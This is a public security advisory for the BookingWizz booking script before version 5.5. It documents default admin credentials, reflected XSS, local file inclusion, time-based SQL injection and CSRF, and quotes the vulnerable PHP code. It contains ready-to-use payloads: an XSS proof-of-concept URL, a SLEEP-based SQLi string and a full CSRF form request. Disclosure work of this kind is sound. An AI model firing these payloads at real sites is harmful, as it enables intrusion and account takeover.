@@ -1,0 +1,276 @@
+1. ADVISORY INFORMATION
+========================================
+Title: BookingWizz < 5.5 Multiple Vulnerability
+Application: BookingWizz
+Class: Sensitive Information disclosure
+Remotely Exploitable: Yes
+Versions Affected: < 5.5
+Vendor URL: http://codecanyon.net/item/booking-system/87919
+Bugs:  Default credentials, CSRF, XXS, SQLi Injection, LFI
+Date of Public Advisory: 15 Jun 2016
+Author: Mehmet Ince
+
+
+2. CREDIT
+========================================
+Those vulnerabilities was identified during external penetration test
+by Mehmet INCE from PRODAFT / INVICTUS
+
+Original Advisory:
+https://www.mehmetince.net/exploit/bookingwizz-55-multiple-vulnerability
+
+PR1 - Default Administrator Credentials
+========================================
+File: install.php
+
+People are to lazy to change default credential unless application force
+them to do that.
+
+Line 128: <br />Default username/password: <b>admin/pass</b></div>";
+
+
+PR2 - Cross Site Scripting
+========================================
+File : eventList.php
+// Improper user input validation on
+
+Line 24: $serviceID =
+(!empty($_REQUEST["serviceID"]))?strip_tags(str_replace("'","`",$_REQUEST["serviceID"])):getDefaultService();
+
+Line 60: <?php echo SAMPLE_TEXT?> <strong><?php echo VIEW?> <a
+href="index.php?serviceID=<?php echo $serviceID?>"><?php echo
+CALENDAR?></a></strong>
+
+Payload = 1337" onmouseover="alert(1)
+PoC =
+http://www.convergine.com/scripts/booking/eventList.php?serviceID=1337%22%20onmouseover=%22alert(1)
+
+
+PR3 - Local File Inclusion
+========================================
+File:config.php
+
+Lang variable is under the user control.
+
+Line 31: $lang = (!empty($_REQUEST["lang"])) ? strip_tags(str_replace("'",
+"`", $_REQUEST["lang"])) : 'english';
+
+Storing user controlled variable within session variable.
+
+Line 36 - 38 :
+
+if (!empty($_REQUEST["action"]) && $_REQUEST["action"] == "changelang") {
+    $_SESSION['curr_lang'] = $lang;
+}
+
+And using it with include function which cause straightforward file
+inclusion.
+
+Line 60 - 68:
+
+$languagePath = MAIN_PATH."/languages/".$_SESSION['curr_lang'].".lang.php";
+if(is_file($languagePath)) {
+
+include MAIN_PATH."/languages/".$_SESSION['curr_lang'].".lang.php";
+
+}else{
+print "ERROR !!! Language file ".$_SESSION['curr_lang'].".lang.php not
+found";
+        exit();
+}
+
+PR4 - SQL Injection
+========================================
+We've seen a lot of potentially SQL Injection vulnerability during code
+review.
+2 example can be given for this potential points.
+
+File : ajax/checkDeletedServices.php
+
+line 19 - 20:
+
+$bsid = (!empty($_REQUEST["bsid"])) ? $_REQUEST["bsid"] : array();
+$type = (!empty($_REQUEST["type"])) ? $_REQUEST["type"] : 'service';
+
+Line 26:
+
+if($type=='service'){
+    $service = getService($id);
+    $name = $service['name'];
+}
+
+This function executes query with $id parameter which is user input through
+checkDeletedServices.php file.
+function getService($id, $field=null) {
+
+    $sql = "SELECT * FROM bs_services WHERE id='{$id}'";
+    $res = mysql_query($sql);
+    if ($field == null) {
+        return mysql_fetch_assoc($res);
+    } else {
+        $row = mysql_fetch_assoc($res);
+        return $row[$field];
+    }
+}
+
+
+File : ajax/checkChangeAvailability.php
+
+Line 19 -21
+$id = (!empty($_REQUEST["id"])) ? $_REQUEST["id"] : '';
+$interval = getServiceSettings($id,'interval');
+
+
+getServiceSettings function calls another function named as getService
+which is also vulnerable against SQL Injection.
+
+function getServiceSettings($id, $field=null) {
+    $serviceType = getService($id,'type');
+    if($serviceType=='t'){
+         $sql = "SELECT * FROM bs_service_settings bss
+                INNER JOIN bs_services bs ON bss.serviceId  = bs.id
+                WHERE bss.serviceID='{$id}'";
+
+    }else{
+         $sql = "SELECT * FROM  bs_service_days_settings bsds
+                INNER JOIN bs_services bs ON bsds.idService  = bs.id
+                WHERE bsds.idService='{$id}'";
+
+    }
+    $res = mysql_query($sql);
+    $row = mysql_fetch_assoc($res);
+    $row['type'] = $serviceType;
+    if ($field == null) {
+        return $row;
+    } else {
+
+        return $row[$field];
+    }
+}
+
+In order to exploit this flaws, Time Based SQLi techniques was used.
+
+Payload: id=1' AND SLEEP(5) AND 'WAlE'='WAlE
+
+PR5 - CSRF
+========================================
+File: bs-settings.php
+
+This file is reponsible for administrator account settings.  Here is the
+HTTP POST request.
+
+POST /booking/bs-settings.php HTTP/1.1
+Host: www.test.dev
+User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101
+Firefox/36.04
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.test.dev/scripts/booking/bs-settings.php
+Cookie: PHPSESSID=1511036c75229f53ae475a0615661394;
+__utma=256227097.1395600583.1465982938.1465982938.1465982938.1;
+__utmc=256227097;
+__utmz=256227097.1465982938.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none);
+wordfence_verifiedHuman=498f28acf0e6151e19053a23c0fbc76b
+Connection: close
+Content-Type: multipart/form-data;
+boundary=---------------------------305761854111129072091034307
+Content-Length: 2678
+
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="new_pass"
+
+
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="new_pass2"
+
+
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="email"
+
+test@yopmail.com
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="pemail"
+
+test@yopmail.com
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="pcurrency"
+
+CAD
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="tax"
+
+
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="time_mode"
+
+0
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="date_mode"
+
+Y-m-d
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="use_popup"
+
+1
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="currency"
+
+$
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="currencyPos"
+
+b
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="lang"
+
+english
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="language_switch"
+
+1
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="timezone"
+
+America/Toronto
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="multi_day_notification"
+
+0
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="multi_day_notification_on"
+
+n
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="single_day_notification"
+
+0
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="single_day_notification_on"
+
+n
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="event_notification"
+
+0
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="event_notification_on"
+
+n
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="cron_type"
+
+cron
+-----------------------------305761854111129072091034307
+Content-Disposition: form-data; name="edit_settings"
+
+yes
+-----------------------------305761854111129072091034307--
+
+
+There is NOT csrf token at all. Furthermore, application does not validated
+current password.
+
+-- 
+Sr. Information Security Engineer
+https://www.mehmetince.net
